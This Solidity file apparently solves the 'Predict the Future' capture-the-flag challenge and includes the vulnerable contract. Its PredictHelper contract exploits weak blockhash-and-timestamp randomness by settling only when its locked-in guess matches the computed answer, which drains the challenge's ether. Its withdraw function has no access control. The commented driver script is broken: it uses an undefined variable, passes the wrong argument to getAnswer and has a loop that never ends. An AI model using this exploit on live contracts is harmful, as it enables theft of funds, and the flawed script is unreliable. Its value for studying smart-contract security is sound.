pragma solidity ^0.4.21;

import './OtherContract.sol';
/*
const oneEth = web3.utils.toWei('1', 'ether');
var predictTheFutureChallenge = await PredictTheFutureChallenge.deployed();
var predictHelper = await PredictHelper.deployed();

var blockNumTarget = await web3.eth.getBlockNumber() + 2;
var answer = await predictHelper.getAnswer(blockNumTarget);
await predictHelper.lockInGuess(answer, {from: accounts[0], value: oneEth});
var blockNumCurrent = await web3.eth.getBlockNumber();
while (blockNumCurrent < blockNumberTarget) {
    await predictHelper.wasteBlock();
}
await predictHelper.settle();
await predictHelper.isComplete();
*/

contract PredictHelper is OtherContract {
    uint8 public waste;
    uint8 guess;
    uint256 settlementBlockNumber;

    function getGuess() public view returns (uint8) {
        return guess;
    }

    function getSettlementBlockNumber() public view returns (uint256) {
        return settlementBlockNumber;
    }

    function getAnswer() public view returns (uint8) {
        return uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
    }

    function wasteBlock() public {
        waste += 1;
    }

    function() public payable { 
    }

    function isComplete() public view returns (bool) {
        require(otherContract != 0);
        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);
        return predictTheFutureChallenge.isComplete();
    }
    
    function lockInGuess(uint8 n) public payable {
        require(otherContract != 0);
        guess = n;
        settlementBlockNumber = block.number + 1;
        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);
        predictTheFutureChallenge.lockInGuess.value(1 ether)(n);
    }
    
    function settle() public {
        require(otherContract != 0);
        uint8 answer = getAnswer();
        require(answer == guess);
        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);
        predictTheFutureChallenge.settle();
        require(predictTheFutureChallenge.isComplete() == true);
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
}

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
